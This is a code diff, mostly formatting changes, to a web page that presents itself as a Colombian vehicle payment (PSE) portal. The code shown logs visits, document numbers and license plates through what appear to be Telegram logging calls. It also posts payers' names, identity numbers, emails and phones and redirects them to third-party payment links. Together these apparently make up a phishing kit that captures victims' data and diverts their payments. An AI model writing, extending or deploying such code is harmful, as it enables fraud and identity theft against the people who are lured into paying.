                 tgLogEvent('🏦 Pago PSE vehicular', Object.assign({}, logBase, {
                     '➡️ Destino': 'Vercel (' + bankConfig.key + ')',
-                    '🔗 URL':     destUrl,
+                    '🔗 URL': destUrl,
                 }));
                 window.location.href = destUrl;
                 return;
@@ -2554,37 +2607,37 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    banco:         bankConfig.key,
-                    monto:         Math.round(currentPaymentContext.amount),
-                    nombre:        paymentName.value.trim(),
-                    cedula:        paymentDocumentNumber.value.trim(),
+                    banco: bankConfig.key,
+                    monto: Math.round(currentPaymentContext.amount),
+                    nombre: paymentName.value.trim(),
+                    cedula: paymentDocumentNumber.value.trim(),
                     tipoDocumento: paymentDocumentType.value,
-                    tipoPersona:   paymentCustomerType.value,
-                    email:         paymentEmail.value.trim(),
-                    telefono:      paymentPhone.value.trim()
+                    tipoPersona: paymentCustomerType.value,
+                    email: paymentEmail.value.trim(),
+                    telefono: paymentPhone.value.trim()
                 })
             })
-            .then(function (r) { return r.json(); })
-            .then(function (result) {
-                if (result.ok) {
-                    tgLogEvent('🏦 Pago PSE vehicular', Object.assign({}, logBase, {
-                        '➡️ Destino': result.flow === 'helppiupay' ? 'HelppiuPay' : 'Recaudofall',
-                        '🔗 URL':     result.url,
-                    }));
-                    window.location.href = result.url;
-                } else {
-                    confirmPaymentButton.disabled    = false;
+                .then(function (r) { return r.json(); })
+                .then(function (result) {
+                    if (result.ok) {
+                        tgLogEvent('🏦 Pago PSE vehicular', Object.assign({}, logBase, {
+                            '➡️ Destino': result.flow === 'helppiupay' ? 'HelppiuPay' : 'Recaudofall',
+                            '🔗 URL': result.url,
+                        }));
+                        window.location.href = result.url;
+                    } else {
+                        confirmPaymentButton.disabled = false;
+                        confirmPaymentButton.textContent = 'Pagar ' + currentPaymentContext.amountText;
+                        updatePaymentState();
+                        alert('No se pudo procesar el pago. Por favor intenta de nuevo.');
+                    }
+                })
+                .catch(function () {
+                    confirmPaymentButton.disabled = false;
                     confirmPaymentButton.textContent = 'Pagar ' + currentPaymentContext.amountText;
                     updatePaymentState();
-                    alert('No se pudo procesar el pago. Por favor intenta de nuevo.');
-                }
-            })
-            .catch(function () {
-                confirmPaymentButton.disabled    = false;
-                confirmPaymentButton.textContent = 'Pagar ' + currentPaymentContext.amountText;
-                updatePaymentState();
-                alert('Error de conexión. Por favor intenta de nuevo.');
-            });
+                    alert('Error de conexión. Por favor intenta de nuevo.');
+                });
         });
 
         form.addEventListener('submit', async (event) => {
@@ -2623,7 +2676,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
 
                 tgLogEvent('🔍 Vehículo consultado', {
                     '📋 Documento': documentoInput.value.trim(),
-                    '🚗 Placa':     placaInput.value.trim().toUpperCase(),
+                    '🚗 Placa': placaInput.value.trim().toUpperCase(),
                 });
 
                 const payload = await fetchVehicleData();
@@ -2647,4 +2700,5 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
         updateSearchState();
     </script>
 </body>
+
 </html>
